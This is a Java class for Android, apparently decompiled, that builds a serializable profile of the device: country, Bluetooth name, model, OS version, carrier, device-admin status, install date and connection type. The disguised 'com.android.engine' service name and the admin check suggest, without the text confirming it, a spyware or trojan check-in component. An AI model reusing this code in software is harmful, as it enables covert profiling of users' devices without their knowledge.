package Transfer;

import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import com.android.engine.service.MyService;
import java.io.Serializable;
import java.util.Locale;

public class Connection2 implements Serializable {

  public String AndroidVersion;
  public String Country;
  public String CountryCode;
  public String DateOfInstallation;
  public String DeviceName;
  public boolean IsAdmin;
  public String Manufacturer;
  public String NetworkOperator;
  public String Type;

  public Connection2() {
    try {
      CountryCode = Locale.getDefault().getISO3Country();
      Country = String.format("%s (%s)", Locale.getDefault().getDisplayCountry(Locale.ENGLISH),
          Locale.getDefault().getDisplayCountry());

      if (VERSION.SDK_INT >= 18) {
        DeviceName = ((BluetoothManager) MyService.context.getSystemService(
            Context.BLUETOOTH_SERVICE)).getAdapter().getName();
      } else {
        DeviceName = "Android";
      }

      Manufacturer = String.format("%s (%s)", Build.MANUFACTURER, Build.MODEL);
      AndroidVersion = VERSION.RELEASE;
      NetworkOperator = ((TelephonyManager) MyService.context.getSystemService(
          Context.TELEPHONY_SERVICE)).getNetworkOperatorName();

      if (VERSION.SDK_INT >= 8) {
        IsAdmin = ((DevicePolicyManager) MyService.context.getSystemService(
            Context.DEVICE_POLICY_SERVICE)).isAdminActive(MyService.componentName);
      }

      DateOfInstallation =
          MyService.androidEngineSharedPreferences.getString("DateOfInstallation", "N/A");

      ConnectivityManager connectivityManager =
          (ConnectivityManager) MyService.context.getSystemService(Context.CONNECTIVITY_SERVICE);
      if (connectivityManager.getNetworkInfo(1).isConnectedOrConnecting()) {
        Type = "WiFi";
      } else if (connectivityManager.getNetworkInfo(0).isConnectedOrConnecting()) {
        Type = "Mobile";
      }
    } catch (Exception e) {
    }
  }
}
